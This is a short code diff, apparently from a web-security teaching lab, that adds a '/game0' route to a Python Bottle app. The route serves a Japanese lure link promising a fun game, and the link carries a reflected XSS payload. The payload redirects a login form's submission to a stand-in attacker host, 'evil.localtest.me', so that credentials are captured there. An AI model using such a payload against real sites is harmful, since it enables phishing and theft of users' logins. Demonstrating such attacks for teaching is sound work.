@@ -46,6 +46,11 @@ def add_user():
     conn.commit()
     redirect(TARGET_URL + '/logout')
 
+@route('/game0')
+def show_game0():
+    return '''
+<p>楽しいゲームで遊ぶには、<a target="_blank" href="http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>">ここをクリック</a>してね！</p>'''
+
 @route('/game1')
 def show_game1():
     return template('''
